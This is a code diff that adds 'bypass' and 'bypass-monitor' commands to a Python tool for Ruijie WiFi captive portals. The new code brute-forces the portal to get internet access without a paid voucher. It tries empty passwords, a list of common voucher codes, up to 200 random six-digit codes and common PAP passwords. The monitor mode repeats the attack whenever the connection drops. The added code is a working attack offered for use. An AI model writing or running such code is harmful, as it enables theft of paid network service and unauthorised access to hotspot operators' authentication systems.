@@ -10,7 +10,9 @@ import asyncio
 import hashlib
 import json
 import logging
+import random
 import re
+import string
 import sys
 from pathlib import Path
 from urllib.parse import unquote
@@ -194,6 +196,126 @@ async def check_internet(session: aiohttp.ClientSession) -> bool:
         return False
 
 
+COMMON_VOUCHERS = [
+    "123456", "000000", "111111", "222222", "333333", "444444",
+    "555555", "666666", "777777", "888888", "999999", "123123",
+    "12345678", "00000000", "121212", "654321", "66666666",
+    "88888888", "1234", "0000", "1111", "2222", "3333", "4444",
+    "guest", "GUEST", "free", "FREE", "wifi", "WIFI",
+    "123456789", "987654321", "100000", "200000", "300000",
+    "admin", "root", "test", "demo", "user", "pass",
+]
+
+
+def random_voucher(length: int = 6) -> str:
+    return "".join(random.choices(string.digits, k=length))
+
+
+async def try_bypass(session: aiohttp.ClientSession, config: Config, max_attempts: int = 200) -> bool:
+    log.info("=" * 50)
+    log.info("BYPASS MODE: Trying to get online without a voucher")
+    log.info("=" * 50)
+
+    domain = config.portal_domain
+
+    if await check_internet(session):
+        log.info("[+] Already online!")
+        return True
+
+    ps = await fetch_portal(session, domain)
+    if not ps.auth_url:
+        log.error("[-] No portal found. Are you connected to Ruijie WiFi?")
+        return False
+
+    log.info(f"[*] Portal found: {ps.auth_url}")
+    log.info(f"[*] Session: {ps.session_id}")
+    log.info(f"[*] CHAP id={ps.chap_id} challenge={ps.chap_challenge}")
+
+    # Strategy 1: Try empty/null password
+    log.info("[1/4] Trying empty/null auth...")
+    if await authenticate(session, ps, ""):
+        log.info("[+] Empty auth worked!")
+        return True
+    if await authenticate(session, ps, "000000"):
+        log.info("[+] Null auth worked!")
+        return True
+
+    # Strategy 2: Try common voucher codes
+    log.info(f"[2/4] Trying {len(COMMON_VOUCHERS)} common voucher codes...")
+    for i, code in enumerate(COMMON_VOUCHERS, 1):
+        ok = await redeem_voucher(session, code)
+        if ok:
+            log.info(f"[+] Voucher found: {code}")
+            config.voucher = code
+            return True
+        if i % 20 == 0:
+            log.info(f"    ... tried {i}/{len(COMMON_VOUCHERS)}")
+
+    if await check_internet(session):
+        log.info("[+] Internet working after common codes!")
+        return True
+
+    # Strategy 3: Try random numeric vouchers
+    log.info(f"[3/4] Trying {max_attempts} random voucher codes...")
+    tried = set()
+    for i in range(max_attempts):
+        code = random_voucher()
+        while code in tried:
+            code = random_voucher()
+        tried.add(code)
+
+        ok = await redeem_voucher(session, code)
+        if ok:
+            log.info(f"[+] Random voucher found: {code}")
+            config.voucher = code
+            return True
+        if i % 50 == 0 and i > 0:
+            log.info(f"    ... tried {i}/{max_attempts}")
+            if await check_internet(session):
+                log.info("[+] Internet working!")
+                return True
+
+    # Strategy 4: Try direct PAP auth with various passwords
+    log.info("[4/4] Trying direct PAP auth with common passwords...")
+    for pwd in ["123456", "guest", "password", "000000", "111111", "admin", ""]:
+        ps2 = await fetch_portal(session, domain)
+        if await authenticate(session, ps2, pwd):
+            log.info(f"[+] Direct auth worked with password: {pwd or '(empty)'}")
+            return True
+
+    log.info("[-] All bypass attempts failed")
+    return False
+
+
+async def cmd_bypass(max_attempts: int, config: Config):
+    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
+    async with aiohttp.ClientSession(headers=headers) as session:
+        ok = await try_bypass(session, config, max_attempts)
+        if ok:
+            log.info("[+] Bypass successful! You should have internet access.")
+        else:
+            log.info("[-] Bypass failed. Try a real voucher with: ./ruijie login <code>")
+
+
+async def cmd_bypass_monitor(interval: int, max_attempts: int, config: Config):
+    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
+    async with aiohttp.ClientSession(headers=headers) as session:
+        log.info(f"Bypass monitor every {interval}s (Ctrl+C to stop)")
+        if not await check_internet(session):
+            log.info("[*] Offline, starting bypass...")
+            await try_bypass(session, config, max_attempts)
+        try:
+            while True:
+                online = await check_internet(session)
+                sym = "\033[1;32mONLINE\033[0m" if online else "\033[1;31mOFFLINE\033[0m"
+                log.info(f"{sym}")
+                if not online:
+                    await try_bypass(session, config, max_attempts)
+                await asyncio.sleep(interval)
+        except (asyncio.CancelledError, KeyboardInterrupt):
+            log.info("Monitor stopped")
+
+
 async def cmd_login(voucher: str, config: Config):
     headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
     async with aiohttp.ClientSession(headers=headers) as session:
@@ -266,9 +388,10 @@ async def main_async():
     print(BANNER)
     parser = argparse.ArgumentParser(description="Ruijie WiFi Portal Tool")
     parser.add_argument("action", nargs="?", default="status",
-                        choices=["login", "monitor", "status", "logout", "set-domain"])
+                        choices=["bypass", "bypass-monitor", "login", "monitor", "status", "logout", "set-domain"])
     parser.add_argument("value", nargs="?", default="", help="Voucher code or domain URL")
     parser.add_argument("-i", "--interval", type=int, default=30, help="Monitor interval (seconds)")
+    parser.add_argument("-m", "--max", type=int, default=200, help="Max random voucher attempts")
     args = parser.parse_args()
 
     config = Config()
@@ -282,6 +405,10 @@ async def main_async():
     if args.action == "set-domain":
         config.portal_domain = args.value.rstrip("/")
         log.info(f"Portal domain set to: {config.portal_domain}")
+    elif args.action == "bypass":
+        await cmd_bypass(args.max, config)
+    elif args.action == "bypass-monitor":
+        await cmd_bypass_monitor(args.interval, args.max, config)
     elif args.action == "login":
         await cmd_login(args.value, config)
     elif args.action == "monitor":
